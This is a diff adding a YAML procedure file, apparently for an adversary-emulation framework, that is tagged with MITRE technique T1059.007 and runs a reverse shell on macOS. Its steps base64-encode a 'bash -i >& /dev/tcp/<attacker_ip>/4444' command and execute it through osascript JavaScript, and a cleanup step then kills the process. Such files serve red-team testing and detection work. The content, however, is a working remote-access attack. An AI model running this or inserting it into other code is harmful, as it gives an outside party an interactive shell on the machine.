@@ -1,0 +1,35 @@
+---
+api_version: 2.0
+uuid: fe4d33c6-6c83-48d6-9fa7-654e8bdde3c2
+name: Reverse Shell using javascript
+authors:
+  - hmashru
+description: |
+  This TTP using javascript runs an encoded reverse shell code in MAC OS.
+requirements:
+  platforms:
+    - os: darwin
+mitre:
+  tactics:
+    - TA0002 Execution
+  techniques:
+    - T1059 Command and Scripting Interpreter
+  subtechniques:
+    - T1059.007 JavaScript
+args:
+  - name: attacker_ip
+    description: IP Address of the attacker for reverse shell
+steps:
+  - name: run-reverse-shell
+    inline: |
+      echo 'bash -i >& /dev/tcp/{{.Args.attacker_ip}}/4444 0>&1' | base64
+    outputvar: encoded_command
+  - name: run-reverse-shell
+    inline: |
+      echo "Running reverse shell..."
+      echo "Encoded command: {[{.StepVars.encoded_command}]}"
+      osascript -l JavaScript JXA-reverse-shell.js '{[{.StepVars.encoded_command}]}'
+  - name: cleanup
+    inline: |
+      echo "Killing reverse shell process"
+      ps -a | grep 'bash -i' | grep -v grep | awk '{print $1}' | xargs kill -9
